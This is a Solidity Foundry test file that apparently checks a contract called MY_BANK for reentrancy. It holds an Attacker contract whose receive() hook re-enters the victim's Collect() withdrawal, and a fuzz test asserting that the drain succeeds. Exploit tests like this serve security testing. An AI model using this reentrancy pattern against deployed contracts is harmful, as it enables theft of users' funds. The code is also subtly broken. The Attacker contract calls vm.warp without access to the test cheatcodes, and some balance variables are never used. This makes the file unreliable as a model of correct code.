
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {MY_BANK} from "../src/MY_BANK.sol";
import {Log} from "../src/MY_BANK.sol";
import {stdStorage, StdStorage} from "../lib/forge-std/src/StdStorage.sol";

contract TestReentrancyMY_BANK is Test {
    using stdStorage for StdStorage;
    
    MY_BANK public _contractUnderTest;
    Log public logContract;
    Attacker public _attacker;

    function setUp() public {
        logContract = new Log();
        _contractUnderTest = new MY_BANK(address(logContract));
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal >= 2 ether && attackVal <= type(uint128).max);
        
        uint256 halfAttackVal = attackVal / 2;
        
        vm.deal(address(_contractUnderTest), attackVal * 2);
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 2);
        
        vm.warp(block.timestamp + 1000);
        
        _attacker.setupAttack{value: halfAttackVal}(halfAttackVal);
        
        uint256 initialAttackerBalance = address(_attacker).balance;
        uint256 initialContractBalance = address(_contractUnderTest).balance;
        
        _attacker.attack(halfAttackVal);
        
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    MY_BANK public _victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public storedAttackVal;
    uint256 public initialBalance;

    constructor(address victimAddress) { 
        _victim = MY_BANK(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        require(msg.value == val, "Must send exactly val");
        
        attackCallCount = 0;
        exploitSucceeded = false;
        storedAttackVal = val;
        
        _victim.Put{value: val}(0);
        
        vm.warp(block.timestamp + 1000);
    }

    function attack(uint256 val) public {
        initialBalance = address(this).balance;
        
        _victim.Collect(val);
        
        if (address(this).balance > initialBalance + val) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 1) {
            attackCallCount++;
            _victim.Collect(storedAttackVal);
        }
    }
}
